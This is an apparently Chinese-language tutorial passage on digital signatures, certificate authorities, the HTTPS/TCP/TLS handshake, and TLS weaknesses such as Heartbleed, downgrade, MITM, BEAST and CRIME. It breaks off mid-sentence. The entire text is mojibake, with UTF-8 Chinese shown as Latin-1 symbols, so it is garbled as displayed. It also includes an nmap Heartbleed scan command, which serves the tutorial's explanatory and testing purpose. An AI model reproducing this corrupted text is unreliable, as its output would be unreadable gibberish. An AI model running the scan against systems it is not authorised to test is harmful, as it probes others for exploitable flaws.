åœ¨æ¶ˆæ¯åŽé¢ï¼Œä¸€èµ·å‘é€è¿‡åŽ»\n\nç­¾åçš„éªŒè¯\n\næ”¶åˆ°æ¶ˆæ¯åŽï¼Œæå–æ¶ˆæ¯ä¸­çš„ç­¾å\nç”¨å…¬é’¥å¯¹ç­¾åè¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°å“ˆå¸Œå€¼1ã€‚\nå¯¹æ¶ˆæ¯ä¸­çš„æ­£æ–‡è¿›è¡Œå“ˆå¸Œè®¡ç®—ï¼Œå¾—åˆ°å“ˆå¸Œå€¼2ã€‚\næ¯”è¾ƒå“ˆå¸Œå€¼1å’Œå“ˆå¸Œå€¼2ï¼Œå¦‚æžœç›¸åŒï¼Œåˆ™éªŒè¯æˆåŠŸã€‚\n\nç®€å•åœ°è¯´ï¼Œæ•°å­—ç­¾åå°±æ˜¯ä½¿ç”¨ç§é’¥åŽ»åŠ å¯†æ¶ˆæ¯æ‘˜è¦å¾—åˆ°çš„å¯†æ–‡ã€‚\næ•°å­—è¯ä¹¦è¯ä¹¦å®žé™…ä¸Šå°±æ˜¯å¯¹å…¬é’¥è¿›è¡Œæ•°å­—ç­¾åï¼Œå®ƒæ˜¯å¯¹å…¬é’¥åˆæ³•æ€§æä¾›è¯æ˜Žçš„æŠ€æœ¯ã€‚\n\næ•°å­—è¯ä¹¦æ˜¯æŒ‡åœ¨äº’è”ç½‘é€šè®¯ä¸­æ ‡å¿—é€šè®¯å„æ–¹èº«ä»½ä¿¡æ¯çš„ä¸€ä¸ªæ•°å­—è®¤è¯ï¼Œäººä»¬å¯ä»¥åœ¨ç½‘ä¸Šç”¨å®ƒæ¥è¯†åˆ«å¯¹æ–¹çš„èº«ä»½ã€‚æ•°å­—è¯ä¹¦å¯¹ç½‘ç»œç”¨æˆ·åœ¨è®¡ç®—æœºç½‘ç»œäº¤æµä¸­çš„ä¿¡æ¯å’Œæ•°æ®ç­‰ä»¥åŠ å¯†æˆ–è§£å¯†çš„å½¢å¼ä¿è¯äº†ä¿¡æ¯å’Œæ•°æ®çš„å®Œæ•´æ€§å’Œå®‰å…¨æ€§ã€‚\n\nè€ƒè™‘è¿™æ ·ä¸€ç§åœºæ™¯ï¼šæˆ‘ä»¬å¯¹ç­¾åè¿›è¡ŒéªŒè¯æ—¶ï¼Œéœ€è¦ç”¨åˆ°å…¬é’¥ã€‚å¦‚æžœå…¬é’¥ä¹Ÿæ˜¯ä¼ªé€ çš„ï¼Œé‚£æ€Žä¹ˆåŠžï¼Ÿå¦‚æžœå…¬é’¥æ˜¯å‡çš„ï¼ŒéªŒè¯æ•°å­—ç­¾åé‚£å°±æ— ä»Žè°ˆèµ·ï¼Œæ ¹æœ¬ä¸å¯èƒ½ä»Žæ•°å­—ç­¾åç¡®å®šå¯¹æ–¹çš„åˆæ³•æ€§ã€‚\nåœ¨éžå¯¹ç§°åŠ å¯†é€šä¿¡è¿‡ç¨‹ä¸­ï¼ŒæœåŠ¡å™¨éœ€è¦å°†å…¬é’¥å‘é€ç»™å®¢æˆ·ç«¯ï¼Œåœ¨è¿™ä¸€è¿‡ç¨‹ä¸­ï¼Œå…¬é’¥å¾ˆå¯èƒ½ä¼šè¢«ç¬¬ä¸‰æ–¹æ‹¦æˆªå¹¶æ›¿æ¢ï¼Œç„¶åŽè¿™ä¸ªç¬¬ä¸‰æ–¹å°±å¯ä»¥å†’å……æœåŠ¡å™¨ä¸Žå®¢æˆ·ç«¯è¿›è¡Œé€šä¿¡ï¼Œè¿™å°±æ˜¯ä¼ è¯´ä¸­çš„â€œä¸­é—´äººæ”»å‡»â€(man in the middle attack)ã€‚è§£å†³æ­¤é—®é¢˜çš„æ–¹æ³•æ˜¯é€šè¿‡å—ä¿¡ä»»çš„ç¬¬ä¸‰æ–¹äº¤æ¢å…¬é’¥ï¼Œå…·ä½“åšæ³•å°±æ˜¯æœåŠ¡å™¨ä¸ç›´æŽ¥å‘å®¢æˆ·ç«¯å‘é€å…¬é’¥ï¼Œè€Œæ˜¯è¦æ±‚å—ä¿¡ä»»çš„ç¬¬ä¸‰æ–¹ï¼Œä¹Ÿå°±æ˜¯è¯ä¹¦è®¤è¯æœºæž„ (Certificate Authority, ç®€ç§° CA)å°†å…¬é’¥åˆå¹¶åˆ°æ•°å­—è¯ä¹¦ä¸­ï¼Œç„¶åŽæœåŠ¡å™¨ä¼šæŠŠå…¬é’¥è¿žåŒè¯ä¹¦ä¸€èµ·å‘é€ç»™å®¢æˆ·ç«¯ï¼Œç§é’¥åˆ™ç”±æœåŠ¡å™¨è‡ªå·±ä¿å­˜ä»¥ç¡®ä¿å®‰å…¨ã€‚æ•°å­—è¯ä¹¦ä¸€èˆ¬åŒ…å«ä»¥ä¸‹å†…å®¹ï¼š\n\nè¯ä¹¦æ‰€æœ‰è€…çš„å…¬é’¥\nè¯ä¹¦æ‰€æœ‰è€…çš„ä¸“æœ‰åç§°\nè¯ä¹¦é¢å‘æœºæž„çš„ä¸“æœ‰åç§°\nè¯ä¹¦çš„æœ‰æ•ˆèµ·å§‹æ—¥æœŸ\nè¯ä¹¦çš„è¿‡æœŸæ—¥æœŸ\nè¯ä¹¦æ•°æ®æ ¼å¼çš„ç‰ˆæœ¬å·\nåºåˆ—å·ï¼Œè¿™æ˜¯è¯ä¹¦é¢å‘æœºæž„ä¸ºè¯¥è¯ä¹¦åˆ†é…çš„å”¯ä¸€æ ‡è¯†ç¬¦\n\n\næŽ¥ä¸‹æ¥åˆæœ‰é—®é¢˜äº†ï¼šéªŒè¯è¯ä¹¦ä¸­çš„æ•°å­—ç­¾åéœ€è¦å¦ä¸€ä¸ªå…¬é’¥ï¼Œé‚£ä¹ˆè¿™ä¸ªå…¬é’¥çš„åˆæ³•æ€§åˆè¯¥å¦‚ä½•ä¿è¯ï¼Ÿè¯¥é—®é¢˜å¯ä»¥æ— é™å¾ªçŽ¯ä¸‹åŽ»ï¼Œå²‚ä¸æ˜¯åˆ°ä¸äº†å¤´äº†ï¼Ÿè¿™å·²ç»æ˜¯ä¸ªç¤¾ä¼šå­¦é—®é¢˜äº†ã€‚æˆ‘ä»¬ä¸ºä»€ä¹ˆæŠŠé’±å­˜è¿›é“¶è¡Œï¼Ÿå› ä¸ºæˆ‘ä»¬ç›¸ä¿¡é“¶è¡Œï¼Œå®ƒæ˜¯ä¸€ä¸ªå¯ä¿¡çš„æœºæž„ï¼ˆè™½ç„¶ä¹Ÿæœ‰ç ´äº§çš„é£Žé™©ï¼‰ã€‚è·Ÿé“¶è¡Œä¸€æ ·ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªå¯ä¿¡çš„æœºæž„æ¥é¢å‘è¯ä¹¦å’Œæä¾›å…¬é’¥ï¼Œåªè¦æ˜¯å®ƒæä¾›çš„å…¬é’¥ï¼Œæˆ‘ä»¬å°±ç›¸ä¿¡æ˜¯åˆæ³•çš„ã€‚\nè¿™ç§æœºæž„ç§°ä¸ºè®¤è¯æœºæž„(Certification Authorityï¼Œ CA)ã€‚CAå°±æ˜¯èƒ½å¤Ÿè®¤å®šâ€å…¬é’¥ç¡®å®žå±žäºŽæ­¤äººâ€ï¼Œå¹¶èƒ½ç”Ÿæˆå…¬é’¥çš„æ•°å­—ç­¾åçš„ç»„ç»‡æˆ–æœºæž„ã€‚CAæœ‰å›½é™…æ€§ç»„ç»‡å’Œæ”¿åºœè®¾ç«‹çš„ç»„ç»‡ï¼Œä¹Ÿæœ‰é€šè¿‡æä¾›è®¤è¯æœåŠ¡æ¥ç›ˆåˆ©çš„ç»„ç»‡ã€‚\n\nè¯ä¹¦é“¾è¯ä¹¦é“¾ï¼Œä¹Ÿç§°ä¸ºè¯ä¹¦è·¯å¾„ï¼Œæ˜¯ç”¨äºŽè®¤è¯å®žä½“åˆæ³•èº«ä»½çš„è¯ä¹¦åˆ—è¡¨ï¼Œå…·ä½“åˆ° HTTPS é€šä¿¡ä¸­ï¼Œå°±æ˜¯ä¸ºäº†éªŒè¯æœåŠ¡å™¨çš„åˆæ³•èº«ä»½ã€‚ä¹‹æ‰€ä»¥ä½¿ç”¨è¯ä¹¦é“¾ï¼Œæ˜¯ä¸ºäº†ä¿è¯æ ¹è¯ä¹¦ çš„å®‰å…¨ï¼Œä¸­é—´å±‚å¯ä»¥çœ‹åšæ ¹è¯ä¹¦çš„ä»£ç†ï¼Œèµ·åˆ°äº†ç¼“å†²çš„ä½œç”¨ã€‚\nä»Žç»å…¸é—®é¢˜è°ˆèµ·æˆ‘ä»¬ä»Žä¸€ä¸ªç»å…¸çš„é—®é¢˜å¼€å§‹ï¼šå½“æˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ä¸€ä¸ªå¯ç”¨äº†httpsçš„åŸŸååˆ°æˆ‘ä»¬çœ‹åˆ°é¡µé¢å›žæ˜¾ï¼Œå‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ\nåœ¨ä»¥å¾€httpçš„æƒ…å†µä¸‹ï¼Œè¿™ä¸ªé—®é¢˜çš„ç­”æ¡ˆç›¸ä¿¡è®¸å¤šäººå·²ç»éžå¸¸æ¸…æ™°äº†ï¼Œä½†æ˜¯è‹¥ç›®æ ‡ç«™ç‚¹å¯ç”¨äº†httpsï¼Œåˆä¼šæœ‰ä»€ä¹ˆä¸ä¸€æ ·çš„åœ°æ–¹å‘¢ï¼Ÿ\nå¸¦ç€è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬é‡æ–°æ¥åˆ†æžä¸€ä¸‹è¿™ä¸ªâ€œåŠ å¼ºç‰ˆâ€çš„ç»å…¸é¢è¯•é¢˜ã€‚\nåŸŸåè§£æžç”±äºŽwebæœåŠ¡æ˜¯å»ºç«‹åœ¨TCPåè®®ä¹‹ä¸Šçš„ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨ipåœ°å€æ¥è¿›è¡Œé€šä¿¡ï¼Œè€ŒåŸŸåè§£æžå°±æ˜¯é€šè¿‡åŸŸååŽ»DNSæœåŠ¡å™¨æŸ¥è¯¢èŽ·å–å¯¹åº”çš„IPçš„è¿‡ç¨‹ï¼Œä¹Ÿæ˜¯è¿™ä¸ªç»å…¸é—®é¢˜çš„ç¬¬ä¸€æ­¥ã€‚\nå»ºç«‹TCPè¿žæŽ¥æµè§ˆå™¨æ‹¿åˆ°å¯¹åº”åŸŸåçš„IPåœ°å€åŽï¼Œå‡†å¤‡å‘ç›®æ ‡æœåŠ¡å™¨å‘èµ·è¿žæŽ¥è¯·æ±‚ï¼Œç”±äºŽæˆ‘ä»¬æ˜¯å‘webæœåŠ¡å™¨å‘èµ·è¿žæŽ¥ï¼Œå› æ­¤æ˜¯é€šè¿‡TCPåè®®è¿›è¡Œè¿žæŽ¥çš„ï¼Œè‡ªç„¶ä¹Ÿå°±æœ‰TCPçš„ä¸‰æ¬¡æ¡æ‰‹å»ºç«‹è¿žæŽ¥çš„è¿‡ç¨‹ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡wiresharkæŠ“åŒ…æ¥æŸ¥çœ‹è¿™ä¸€è¿‡ç¨‹ã€‚\n\né€šè¿‡è®¾ç½®ç®€å•çš„è¿‡æ»¤å™¨ï¼Œè®¿é—®https://annevi.cnå³å¯èŽ·å–åˆ°ä¸‰æ¬¡æ¡æ‰‹çš„è¿‡ç¨‹ã€‚æˆ‘ä»¬é¡ºå¸¦æ¥å…·ä½“çš„çœ‹ä¸€ä¸‹ã€‚\n\né¦–å…ˆæ˜¯å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªSYNï¼Œè¡¨ç¤ºè¦æ±‚å»ºç«‹è¿žæŽ¥ï¼ŒåŒæ—¶å‘é€Seq=0,éšåŽå®¢æˆ·ç«¯è¿›å…¥SYN-SENTé˜¶æ®µã€‚\næœåŠ¡å™¨ç«¯æŽ¥æ”¶åˆ°æ¥è‡ªå®¢æˆ·ç«¯çš„TCPæŠ¥æ–‡ä¹‹åŽï¼Œç»“æŸLISTENé˜¶æ®µã€‚å¹¶è¿”å›žä¸€æ®µTCPæŠ¥æ–‡ï¼Œæž„é€ ä¸€ä¸ª[SYN ACK]çš„æ•°æ®åŒ…ï¼ŒåŒæ—¶å°†ackå€¼è®¾ä¸ºseq+1ã€‚éšåŽæœåŠ¡å™¨ç«¯è¿›å…¥SYN-RCVDé˜¶æ®µã€‚\nå®¢æˆ·ç«¯æŽ¥æ”¶åˆ°æ¥è‡ªæœåŠ¡å™¨ç«¯çš„ç¡®è®¤æ”¶åˆ°æ•°æ®çš„TCPæŠ¥æ–‡ä¹‹åŽï¼Œæ˜Žç¡®äº†ä»Žå®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨çš„æ•°æ®ä¼ è¾“æ˜¯æ­£å¸¸çš„ï¼Œç»“æŸSYN-SENTé˜¶æ®µã€‚å¹¶è¿”å›žæœ€åŽä¸€æ®µTCPæŠ¥æ–‡,è®¾ç½®seq+=1 ackåˆ™ç­‰äºŽæœåŠ¡å™¨ç«¯æ•°æ®åŒ…çš„seq+1,éšåŽå®¢æˆ·ç«¯è¿›å…¥ESTABLISHEDé˜¶æ®µã€‚\n\nå®Œæˆä¸Šè¿°åŸºæœ¬æ­¥éª¤åŽï¼Œä¸€ä¸ªå®Œæ•´çš„TCPè¿žæŽ¥å°±æˆåŠŸå»ºç«‹äº†\n\nTLSæ¡æ‰‹*ä¸ºäº†å»ºç«‹å®‰å…¨è¿žæŽ¥ï¼Œé€šä¿¡åŒæ–¹åœ¨å®ŒæˆTCPçš„ä¸‰æ¬¡æ¡æ‰‹ä¹‹åŽï¼Œç´§æŽ¥ç€å°±è¦è¿›è¡ŒTLSçš„å››æ¬¡æ¡æ‰‹ï¼ŒTLSæ¡æ‰‹çš„ç›®çš„ä¸»è¦æ˜¯ä¸ºäº†ï¼š\n\nå•†å®šåŒæ–¹é€šä¿¡æ‰€ä½¿ç”¨çš„çš„ TLS ç‰ˆæœ¬ (ä¾‹å¦‚ TLS1.0, 1.2, 1.3ç­‰ç­‰)ï¼›\nç¡®å®šåŒæ–¹æ‰€è¦ä½¿ç”¨çš„å¯†ç ç»„åˆï¼›\nå®¢æˆ·ç«¯é€šè¿‡æœåŠ¡å™¨çš„å…¬é’¥å’Œæ•°å­—è¯ä¹¦ä¸Šçš„æ•°å­—ç­¾åéªŒè¯æœåŠ¡ç«¯çš„èº«ä»½ï¼›\nç”Ÿæˆä¼šè¯å¯†é’¥ï¼Œè¯¥å¯†é’¥å°†ç”¨äºŽæ¡æ‰‹ç»“æŸåŽçš„å¯¹ç§°åŠ å¯†ã€‚\n\n\nä¸‹é¢å°†ä»‹ç»ä¸€ä¸‹TLSæ¡æ‰‹çš„è¿‡ç¨‹\nClient Helloå®¢æˆ·ç«¯ç”Ÿæˆå¹¶å‘é€ä¸€æ®µéšæœºå­—ç¬¦ä¸²ä»¥åŠæ‰€æ”¯æŒçš„åŠ å¯†ç®—æ³•ï¼Œå¦‚å›¾ï¼š\n\nServer HelloæœåŠ¡å™¨å‘é€â€Server Helloâ€æ¶ˆæ¯å¯¹å®¢æˆ·ç«¯è¿›è¡Œå›žåº”ï¼Œè¯¥æ¶ˆæ¯åŒ…å«äº†æ•°å­—è¯ä¹¦ï¼ŒæœåŠ¡å™¨é€‰æ‹©çš„å¯†ç ç»„åˆå’Œâ€server randomâ€éšæœºå­—ç¬¦ä¸²\n\néªŒè¯å®¢æˆ·ç«¯å¯¹æœåŠ¡å™¨å‘æ¥çš„è¯ä¹¦è¿›è¡ŒéªŒè¯ï¼Œç¡®ä¿å¯¹æ–¹çš„åˆæ³•èº«ä»½ï¼ŒéªŒè¯è¿‡ç¨‹å¯ä»¥ç»†åŒ–ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š\n\næ£€æŸ¥æ•°å­—ç­¾å\néªŒè¯è¯ä¹¦é“¾\næ£€æŸ¥è¯ä¹¦çš„æœ‰æ•ˆæœŸ\næ£€æŸ¥è¯ä¹¦çš„æ’¤å›žçŠ¶æ€ (æ’¤å›žä»£è¡¨è¯ä¹¦å·²å¤±æ•ˆ)\n\nPre-master secretå®¢æˆ·ç«¯åœ¨å‰é¢çš„æ­¥éª¤ä¸­å·²ç»èŽ·å–åˆ°äº†æœåŠ¡ç«¯æ‰€ç»™äºˆçš„å…¬é’¥ï¼Œå› æ­¤å°±å¯ä»¥å‘é€ä½¿ç”¨è¿™ä¸ªå…¬é’¥åŠ å¯†ä¹‹åŽçš„å¦ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²â€pre-master secret (é¢„ä¸»å¯†é’¥)â€ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²æ˜¯ç»è¿‡æœåŠ¡å™¨çš„å…¬é’¥åŠ å¯†è¿‡çš„ï¼Œåªæœ‰å¯¹åº”çš„ç§é’¥æ‰èƒ½è§£å¯†ã€‚\nè§£å¯† Pre-master secretæœåŠ¡å™¨ä½¿ç”¨ç§é’¥è§£å¯†Pre-master secret,èŽ·å–å…¶æ˜Žæ–‡ã€‚\nç”Ÿæˆå…±äº«å¯†é’¥å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å‡ä½¿ç”¨ client randomï¼Œserver random å’Œ premaster secretï¼Œå¹¶é€šè¿‡ç›¸åŒçš„ç®—æ³•ç”Ÿæˆç›¸åŒçš„å…±äº«å¯†é’¥ KEYï¼Œç”¨äºŽåŽé¢çš„å¯¹ç§°åŠ å¯†ä¼ è¾“ã€‚\nå®¢æˆ·ç«¯å°±ç»ªå®¢æˆ·ç«¯å‘é€ç»è¿‡å…±äº«å¯†é’¥ KEYåŠ å¯†è¿‡çš„ finishedä¿¡å·ã€‚\næœåŠ¡ç«¯å°±ç»ªæœåŠ¡å™¨å‘é€ç»è¿‡å…±äº«å¯†é’¥ **KEY **åŠ å¯†è¿‡çš„finishedä¿¡å·ã€‚\nè¾¾æˆå®‰å…¨é€šä¿¡æ¡æ‰‹å®Œæˆï¼ŒåŒæ–¹ä½¿ç”¨å¯¹ç§°åŠ å¯†è¿›è¡Œå®‰å…¨é€šä¿¡ã€‚\n\næ€»ç»“æ€»çš„æ¥è¯´ï¼ŒTLSçš„å››æ¬¡æ¡æ‰‹ä¸»è¦æ¦‚æ‹¬å¦‚ä¸‹ï¼š\nå®¢æˆ·ç«¯å‘å‡ºè¯·æ±‚ï¼Œå‘æœåŠ¡ç«¯æä¾›ä»¥ä¸‹ä¿¡æ¯ï¼š\n\næ”¯æŒçš„åè®®ç‰ˆæœ¬ï¼Œæ¯”å¦‚ TLS 1.0 ç‰ˆã€‚\nä¸€ä¸ªå®¢æˆ·ç«¯ç”Ÿæˆçš„éšæœºæ•°ï¼Œç¨åŽç”¨äºŽç”Ÿæˆâ€å¯¹è¯å¯†é’¥â€ã€‚\næ”¯æŒçš„åŠ å¯†æ–¹æ³•ï¼Œæ¯”å¦‚ RSA å…¬é’¥åŠ å¯†ã€‚\næ”¯æŒçš„åŽ‹ç¼©æ–¹æ³•ã€‚\n\næœåŠ¡å™¨å›žåº”ä»¥ä¸‹ä¿¡æ¯ï¼š\n\nç¡®è®¤ä½¿ç”¨çš„åŠ å¯†é€šä¿¡åè®®ç‰ˆæœ¬ï¼Œæ¯”å¦‚ TLS 1.0 ç‰ˆæœ¬ã€‚å¦‚æžœæµè§ˆå™¨ä¸ŽæœåŠ¡å™¨æ”¯æŒçš„ç‰ˆæœ¬ä¸ä¸€è‡´ï¼ŒæœåŠ¡å™¨å…³é—­åŠ å¯†é€šä¿¡ã€‚\nç¡®è®¤ä½¿ç”¨çš„åŠ å¯†æ–¹æ³•ï¼Œæ¯”å¦‚ RSA å…¬é’¥åŠ å¯†ï¼Œè¿”å›žåŠ å¯†å…¬é’¥\næœåŠ¡å™¨è¯ä¹¦\n\nå®¢æˆ·ç«¯å›žåº”\n\néªŒè¯è¯ä¹¦çš„åˆæ³•æ€§ï¼ˆé¢å‘è¯ä¹¦çš„æœºæž„æ˜¯å¦åˆæ³•ï¼Œè¯ä¹¦ä¸­åŒ…å«çš„ç½‘ç«™åœ°å€æ˜¯å¦ä¸Žæ­£åœ¨è®¿é—®çš„åœ°å€ä¸€è‡´ç­‰ï¼‰ï¼Œå¦‚æžœè¯ä¹¦å—ä¿¡ä»»ï¼Œåˆ™æµè§ˆå™¨æ é‡Œé¢ä¼šæ˜¾ç¤ºä¸€ä¸ªå°é”å¤´ï¼Œå¦åˆ™ä¼šç»™å‡ºè¯ä¹¦ä¸å—ä¿¡çš„æç¤ºã€‚\nå¦‚æžœè¯ä¹¦å—ä¿¡ä»»ï¼Œæˆ–è€…æ˜¯ç”¨æˆ·æŽ¥å—äº†ä¸å—ä¿¡çš„è¯ä¹¦ï¼Œæµè§ˆå™¨ä¼šç”Ÿæˆä¸€ä¸²éšæœºæ•°çš„å¯†ç ï¼Œå¹¶ç”¨è¯ä¹¦ä¸­æä¾›çš„å…¬é’¥åŠ å¯†ã€‚\nä½¿ç”¨çº¦å®šå¥½çš„ HASH è®¡ç®—æ¡æ‰‹æ¶ˆæ¯ï¼Œå¹¶ä½¿ç”¨ç”Ÿæˆçš„éšæœºæ•°å¯¹æ¶ˆæ¯è¿›è¡ŒåŠ å¯†ï¼Œæœ€åŽå°†ä¹‹å‰ç”Ÿæˆçš„æ‰€æœ‰ä¿¡æ¯å‘é€ç»™ç½‘ç«™ã€‚\n\næœåŠ¡å™¨\n\nä½¿ç”¨è‡ªå·±çš„ç§é’¥å°†ä¿¡æ¯è§£å¯†å–å‡ºå¯†ç ï¼Œä½¿ç”¨å¯†ç è§£å¯†æµè§ˆå™¨å‘æ¥çš„æ¡æ‰‹æ¶ˆæ¯ï¼Œå¹¶éªŒè¯æ˜¯å¦ä¸Žæµè§ˆå™¨å‘æ¥çš„ä¸€è‡´ã€‚\nä½¿ç”¨å¯†ç åŠ å¯†ä¸€æ®µæ¡æ‰‹æ¶ˆæ¯ï¼Œå‘é€ç»™æµè§ˆå™¨ã€‚\n\n\nå¯ä»¥çœ‹åˆ°ï¼Œhttps å»ºç«‹è¿žæŽ¥éœ€è¦7æ¬¡æ¡æ‰‹(TCP 3æ¬¡ TLS 4æ¬¡)\nTLS çš„å®‰å…¨é—®é¢˜OpenSSLå¿ƒè„æ»´è¡€æ¼æ´ž\n2014å¹´4æœˆ8æ—¥ï¼Œäº’è”ç½‘ä¸Šæ›å‡ºäº†ä¸¥é‡ä¸€ä¸ªæ¼æ´žç§°ä¸ºHeartbleedï¼Œè¯¥æ¼æ´žç”±å®‰å…¨å…¬å¸Codenomiconå’Œè°·æ­Œå®‰å…¨å·¥ç¨‹å¸ˆå‘çŽ°ã€‚Heartbleedæ¼æ´žï¼Œé€ æˆè®¸ä»»ä½•äººåœ¨äº’è”ç½‘ä¸Šé˜…è¯»ç³»ç»Ÿçš„å†…å­˜ä¿æŠ¤è„†å¼±çš„OpenSSLçš„è½¯ä»¶ç‰ˆæœ¬ã€‚ è¿™ç§å¦¥åå¯†é’¥ç”¨äºŽè¯†åˆ«æœåŠ¡æä¾›è€…å’ŒåŠ å¯†æµé‡,ç”¨æˆ·åå’Œå¯†ç çš„å’Œå®žé™…çš„å†…å®¹ã€‚ è¿™å…è®¸æ”»å‡»è€…çªƒå¬é€šä¿¡ã€çªƒå–æ•°æ®ç›´æŽ¥ä»ŽæœåŠ¡å’Œç”¨æˆ·å’Œæ¨¡æ‹ŸæœåŠ¡å’Œç”¨æˆ·ã€‚\n\nåŽŸç†OpenSSL åœ¨å®žçŽ° TLS å’Œ DTLS çš„å¿ƒè·³å¤„ç†é€»è¾‘æ—¶ï¼Œå­˜åœ¨ç¼–ç ç¼ºé™·ã€‚OpenSSL çš„å¿ƒè·³å¤„ç†é€»è¾‘æ²¡æœ‰æ£€æµ‹å¿ƒè·³åŒ…ä¸­çš„é•¿åº¦å­—æ®µæ˜¯å¦å’ŒåŽç»­çš„æ•°æ®å­—æ®µç›¸ç¬¦åˆï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ç‚¹ï¼Œæž„é€ å¼‚å¸¸çš„æ•°æ®åŒ…ï¼Œæ¥èŽ·å–å¿ƒè·³æ•°æ®æ‰€åœ¨çš„å†…å­˜åŒºåŸŸçš„åŽç»­æ•°æ®ã€‚è¿™äº›æ•°æ®ä¸­å¯èƒ½åŒ…å«äº†è¯ä¹¦ç§é’¥ã€ç”¨æˆ·åã€ç”¨æˆ·å¯†ç ã€ç”¨æˆ·é‚®ç®±ç­‰æ•æ„Ÿä¿¡æ¯ã€‚è¯¥æ¼æ´žå…è®¸æ”»å‡»è€…ï¼Œä»Žå†…å­˜ä¸­è¯»å–å¤šè¾¾64KBçš„æ•°æ®ã€‚\nå¸¸è§åœºæ™¯\nä½¿ç”¨äº†opensslæ‰©å±•åº“åŠ å¯†çš„ç½‘ç»œåè®®\nhttps\nSSL VPN\né‚®ä»¶æœåŠ¡å™¨\n\næµ‹è¯•æ–¹æ¡ˆnmap\nnmap -sV -p 443 --script ssl-heartbleed.nse [Target]\n\nhttps://filippo.io/Heartbleed/\nhttp://wangzhan.360.cn/heartbleed/\nDowngradeï¼ˆé™çº§æ”»å‡»ï¼‰é™çº§æ”»å‡»æ˜¯ä¸€ç§å¯¹è®¡ç®—æœºç³»ç»Ÿæˆ–è€…é€šä¿¡åè®®çš„æ”»å‡»ï¼Œåœ¨é™çº§æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…æ•…æ„ä½¿ç³»ç»Ÿæ”¾å¼ƒæ–°å¼ã€å®‰å…¨æ€§é«˜çš„å·¥ä½œæ–¹å¼ï¼Œåè€Œä½¿ç”¨ä¸ºå‘ä¸‹å…¼å®¹è€Œå‡†å¤‡çš„è€å¼ã€å®‰å…¨æ€§å·®çš„å·¥ä½œæ–¹å¼ï¼Œé™çº§æ”»å‡»å¸¸è¢«ç”¨äºŽä¸­é—´äººæ”»å‡»ï¼Œè®²åŠ å¯†çš„é€šä¿¡åè®®å®‰å…¨æ€§å¤§å¹…å‰Šå¼±ï¼Œå¾—ä»¥è¿›è¡ŒåŽŸæœ¬ä¸å¯èƒ½åšåˆ°çš„æ”»å‡»ã€‚ åœ¨çŽ°ä»£çš„å›žé€€é˜²å¾¡ä¸­ï¼Œä½¿ç”¨å•ç‹¬çš„ä¿¡å·å¥—ä»¶æ¥æŒ‡ç¤ºè‡ªæ„¿é™çº§è¡Œä¸ºï¼Œéœ€è¦ç†è§£è¯¥ä¿¡å·å¹¶æ”¯æŒæ›´é«˜åè®®ç‰ˆæœ¬çš„æœåŠ¡å™¨æ¥ç»ˆæ­¢åå•†ï¼Œè¯¥å¥—ä»¶æ˜¯ TLS_FALLBACK_SCSV(0x5600)\nMITMï¼ˆä¸­é—´äººæ”»å‡»ï¼‰MITM(Man-in-the-MiddleAttack) ï¼Œæ˜¯æŒ‡æ”»å‡»è€…ä¸Žé€šè®¯çš„ä¸¤ç«¯åˆ†åˆ«åˆ›å»ºç‹¬ç«‹çš„è”ç³»ï¼Œå¹¶äº¤æ¢å…¶æ‰€æœ‰æ”¶åˆ°çš„æ•°æ®ï¼Œä½¿é€šè®¯çš„ä¸¤ç«¯è®¤ä¸ºä»–ä»¬æ­£åœ¨é€šè¿‡ä¸€ä¸ªç§å¯†çš„è¿žæŽ¥ä¸Žå¯¹æ–¹ç›´æŽ¥å¯¹è¯ï¼Œä½†äº‹å®žä¸Šæ•´ä¸ªå¯¹è¯éƒ½è¢«æ”»å‡»è€…å®Œå…¨æŽ§åˆ¶ï¼Œåœ¨ä¸­é—´äººæ”»å‡»ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥æ‹¦æˆªé€šè®¯åŒæ–¹çš„é€šè¯å¹¶æ’å…¥æ–°çš„å†…å®¹ã€‚ä¸€ä¸ªä¸­é—´äººæ”»å‡»èƒ½æˆåŠŸçš„å‰ææ¡ä»¶æ˜¯æ”»å‡»è€…èƒ½å¤Ÿå°†è‡ªå·±ä¼ªè£…æˆæ¯ä¸ªå‚ä¸Žä¼šè¯çš„ç»ˆç«¯ï¼Œå¹¶ä¸”ä¸è¢«å…¶ä»–ç»ˆç«¯è¯†ç ´ã€‚\nBEAST (é‡Žå…½æ”»å‡»ï¼‰BEAST(CVE-2011-3389) BEASTæ˜¯ä¸€ç§æ˜Žæ–‡æ”»å‡»ï¼Œé€šè¿‡ä»ŽSSL/TLSåŠ å¯†çš„ä¼šè¯ä¸­èŽ·å–å—å®³è€…çš„COOKIEå€¼ï¼ˆé€šè¿‡è¿›è¡Œä¸€æ¬¡ä¼šè¯åŠ«æŒæ”»å‡»ï¼‰ï¼Œè¿›è€Œç¯¡æ”¹ä¸€ä¸ªåŠ å¯†ç®—æ³•çš„ CBCï¼ˆå¯†ç å—é“¾ï¼‰çš„æ¨¡å¼ä»¥å®žçŽ°æ”»å‡»ç›®å½•ï¼Œå…¶ä¸»è¦é’ˆå¯¹TLS1.0å’Œæ›´æ—©ç‰ˆæœ¬çš„åè®®ä¸­çš„å¯¹ç§°åŠ å¯†ç®—æ³•CBCæ¨¡å¼ã€‚\nCRIMEï¼ˆç½ªæ¶æ”»å‡»ï¼‰CRIME(CVE-2012-4929)ï¼Œå…¨ç§°Compression Ratio Info-leak Made Easyï¼Œè¿™æ˜¯ä¸€ç§å› SSLåŽ‹ç¼©é€ æˆçš„å®‰å…¨éšæ‚£ï¼Œé€šè¿‡å®ƒå¯çªƒå–å¯ç”¨æ•°æ®åŽ‹ç¼©ç‰¹æ€§çš„HTTPSæˆ–SPDYåè®®ä¼ è¾“çš„ç§å¯†Web 